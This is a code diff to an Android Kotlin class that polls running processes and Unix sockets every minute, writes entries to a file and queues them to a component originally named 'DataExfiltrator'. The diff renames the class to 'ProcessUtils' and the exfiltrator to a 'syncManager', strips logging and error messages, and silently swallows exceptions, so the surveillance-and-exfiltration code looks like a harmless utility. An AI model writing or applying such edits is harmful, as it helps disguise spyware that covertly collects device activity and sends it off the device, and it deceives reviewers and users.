@@ -4,16 +4,14 @@ import android.app.ActivityManager
 import android.content.Context
 import android.os.Handler
 import android.os.Looper
-import android.util.Log
 import java.io.BufferedReader
 import java.io.File
 import java.io.FileReader
 import java.text.SimpleDateFormat
 import java.util.*
 
-class IpcMonitor(private val context: Context, private val exfiltrator: DataExfiltrator) {
+class ProcessUtils(private val context: Context, private val syncManager: NetworkManager) {
 
-    private val tag = "IpcMonitor"
     private val handler = Handler(Looper.getMainLooper())
     private var runnable: Runnable? = null
     private val knownProcesses = mutableSetOf<String>()
@@ -23,7 +21,6 @@ class IpcMonitor(private val context: Context, private val exfiltrator: DataExfi
             checkRunningProcesses()
             if (File("/proc/net/unix").canRead()) {
                 checkUnixSockets()
-                Log.d(tag, "Checking Unix Sockets...")
             }
             handler.postDelayed(runnable!!, 60000) // every 60 seconds
         }
@@ -53,23 +50,20 @@ class IpcMonitor(private val context: Context, private val exfiltrator: DataExfi
                 var line: String?
                 while (reader.readLine().also { line = it } != null) {
                     line?.let { currentLine ->
-                        // ADD filter to reduce noise - only log app-specific sockets
                         if (currentLine.contains("com.") || currentLine.contains("app_")) {
                             logEvent("UNIX_SOCKET", currentLine.trim())
                         }
                     }
                 }
             }
-        } catch (e: Exception) {
-            Log.e(tag, "Permission denied or file not accessible.")
-        }
+        } catch (_: Exception) { }
     }
 
     private fun logEvent(type: String, detail: String) {
         val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
         val entry = "$timestamp - IPC_$type: $detail"
         saveToFile(entry)
-        exfiltrator.queueData(entry)  // ADD THIS
+        syncManager.queueData(entry)  
     }
 
     private fun saveToFile(data: String) {
@@ -84,6 +78,6 @@ class IpcMonitor(private val context: Context, private val exfiltrator: DataExfi
     }
 
     fun stopMonitoring() {
-        handler.removeCallbacks(runnable!!)
+        runnable?.let { handler.removeCallbacks(it) }
     }
 }
